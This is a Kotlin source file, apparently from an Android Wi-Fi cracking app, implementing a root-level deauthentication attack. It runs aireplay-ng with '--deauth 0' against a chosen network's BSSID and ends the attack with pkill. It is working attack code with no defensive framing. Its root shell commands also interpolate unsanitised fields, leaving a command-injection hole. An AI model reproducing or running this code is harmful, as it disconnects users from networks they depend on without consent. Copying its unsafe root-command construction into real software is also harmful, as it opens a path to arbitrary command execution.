package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DeauthAttack @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
) : WifiAttack {
    override fun execute(attack: Attack): Flow<String> = flow {
        val binary = binaryInstaller.getBinaryPath("aireplay-ng")
        emit("[*] Starting deauthentication attack on ${attack.targetBssid}")
        val cmd = "$binary --deauth 0 -a ${attack.targetBssid} ${attack.interfaceName}"
        shellExecutor.executeAsRoot(cmd)
        emit("[+] Deauth packets sent to ${attack.targetBssid}")
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'aireplay-ng.*${attack.targetBssid}'")
    }
}
